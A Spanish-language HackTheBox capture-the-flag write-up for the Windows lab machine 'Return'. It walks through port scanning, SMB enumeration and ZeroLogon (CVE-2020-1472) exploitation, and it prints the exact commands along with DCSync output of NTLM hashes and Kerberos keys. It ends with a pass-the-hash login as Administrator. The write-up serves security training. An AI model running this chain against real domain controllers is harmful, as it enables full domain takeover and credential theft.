---
icon: windows
tags:
  - smb
  - kerberos
  - active-directory
  - ldap
  - winrm
  - pass-the-hash
  - dcsync
  - zerologon
  - cve-2020-1472
---

# Return

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Return        |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 15/11/2026    |
| **IP Objetivo**       | 10.129.95.241 |

### Executive Summary

Se detectó una vulnerabilidad crítica **ZeroLogon (CVE-2020-1472)** en el servicio Netlogon de Microsoft Windows.

La explotación de esta vulnerabilidad permitió modificar la contraseña de la cuenta de equipo del controlador de dominio, obteniendo acceso sin credenciales válidas. A partir de este acceso, fue posible extraer los hashes NTLM y las claves Kerberos de las cuentas del dominio mediante una operación DCSync.

Posteriormente, se obtuvo el hash NTLM de la cuenta **Administrator**, que permitió realizar un ataque **Pass-The-Hash** y establecer una sesión remota con privilegios de administrador mediante Evil-WinRM.

### Técnicas

* Explotación de ZeroLogon (CVE-2020-1472)
* Pass-The-Hash
* DCSync

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -sS -Pn -n -vv --min-rate 5000 -p- 10.129.95.241 -oG allPorts
```

```bash
> nmap -sCV -Pn -n -v -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,49671,49676,49677,49678,49682,49690,49700 10.129.95.241 -oG allServices
```

| Puerto    | Servicio      | Versión                                                                                       |
| --------- | ------------- | --------------------------------------------------------------------------------------------- |
| 53/tcp    | domain        | Simple DNS Plus                                                                               |
| 80/tcp    | http          | Microsoft IIS httpd 10.0                                                                      |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos (server time: 2026-11-15 07:54:05Z)                                |
| 135/tcp   | msrpc         | Microsoft Windows RPC                                                                         |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn                                                                 |
| 389/tcp   | ldap          | Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name) |
| 445/tcp   | microsoft-ds? |                                                                                               |
| 464/tcp   | kpasswd5?     |                                                                                               |
| 593/tcp   | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                           |
| 636/tcp   | tcpwrapped    |                                                                                               |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name) |
| 3269/tcp  | tcpwrapped    |                                                                                               |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                      |
| 9389/tcp  | mc-nmf        | .NET Message Framing                                                                          |
| 47001/tcp | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                      |
| 49664/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49665/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49667/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49668/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49671/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49676/tcp | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                           |
| 49677/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49678/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49682/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49690/tcp | msrpc         | Microsoft Windows RPC                                                                         |
| 49700/tcp | msrpc         | Microsoft Windows RPC                                                                         |

### Enumeration

#### Web

![15-11-2026 10.00.12 \[Report\]](<../../../.gitbook/assets/15-11-2026 10.00.12 \[Report].webp>)

#### SMB

SMB Fingerprinting

```bash
> nxc smb 10.129.95.241
```

![15-11-2026 08.44.25 \[ScratchPad\]](<../../../.gitbook/assets/15-11-2026 08.44.25 \[ScratchPad].webp>)

Name: PRINTER$ Domain: return.local

NULL AUTH Permitido

```bash
> nxc smb 10.129.95.241 -u '' -p ''
[+] return.local\: 
```

Sin capacidad de enumerar usuarios ni recursos compartidos

```bash
> nxc smb 10.129.95.241 -u '' -p '' --users
[+] return.local\: 
> nxc smb 10.129.95.241 -u '' -p '' --rid-brute
[-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED
> nxc smb 10.129.95.241 -u '' -p '' --shares
[-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Usuario guest deshabilitado

```bash
> nxc smb 10.129.95.241 -u 'guest' -p ''
[-] return.local\guest: STATUS_ACCOUNT_DISABLED
```

Sin capacidad de enumeración RPC

```bash
> rpcclient -U '%' 10.129.95.241
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprinters
result was NT_STATUS_ACCESS_DENIED
```

Detección de vulnerabilidad ZeroLogon (CVE-2020-1472)

```bash
> nxc smb 10.129.95.241 -u '' -p '' -M zerologon
VULNERABLE
Next step: https://github.com/dirkjanm/CVE-2020-1472
```

## Explotación

### Foothold

* **Vulnerabilidad:** ZeroLogon (CVE-2020-1472)
* **Exploit:** https://github.com/dirkjanm/CVE-2020-1472
* **Procedimiento:**

1. Se explota la vulnerabilidad ZeroLogon, que establece la contraseña del dominio NULL

```bash
> python3 cve-2020-1472-exploit.py PRINTER$ 10.129.95.241
```

2. Secrets Dump

```bash
> impacket-secretsdump -no-pass -just-dc return.local/PRINTER\$@10.129.95.241
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e48ce125611add31a32cd79e529964b:::
return.local\svc-printer:1103:aad3b435b51404eeaad3b435b51404ee:c1d26bdcecf44246b5f8653284331a2e:::
PRINTER$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:aes256-cts-hmac-sha1-96:2f7d707eb859ec2c26109953831f54861a0ee47d3e4b16dde7f17009d08297b0
Administrator:aes128-cts-hmac-sha1-96:ef8673c4ba668752432c817dda62af48
Administrator:des-cbc-md5:4f0ee6291aabd338
krbtgt:aes256-cts-hmac-sha1-96:cc6ddaa28d2bb97926dabd1b82845479a97080aad93eddfd2ccf4f2ddf00961a
krbtgt:aes128-cts-hmac-sha1-96:cc5f4a49b6a0cdb71cdea34e84ba2a2e
krbtgt:des-cbc-md5:1086497c1fc1ab8a
return.local\svc-printer:aes256-cts-hmac-sha1-96:6dd6f85d0cf31eb1c01d7aff4e30a58bc5948e6f05e6d88f5cdb57be0208117d
return.local\svc-printer:aes128-cts-hmac-sha1-96:a92bc84131dcd4309431242e8ee9437e
return.local\svc-printer:des-cbc-md5:574cb9a8a8e5cb43
PRINTER$:aes256-cts-hmac-sha1-96:d90be0e50526f764ce407185706c3dbe9d64c5201437cb4c4de2395ee6cff5a9
PRINTER$:aes128-cts-hmac-sha1-96:c87c438c04ba990a826c7cdb2f133328
PRINTER$:des-cbc-md5:2f2a515b088c921a
```

3. Pass-The-Hash con usuario Administrator

```bash
> evil-winrm -i 10.129.95.241 -u 'Administrator' -H '32db622ed9c00dd1039d8288b0407460'
```

* **Evidencia:** (`user.txt`)

&#x20;

<figure><img src="../../../.gitbook/assets/15-11-2026 10.04.37 [Report].webp" alt="" width="348"><figcaption></figcaption></figure>

* **Evidencia:** (`root.txt`)&#x20;

<figure><img src="../../../.gitbook/assets/15-11-2026 10.04.32 [Report].webp" alt="" width="497"><figcaption></figcaption></figure>

```
```
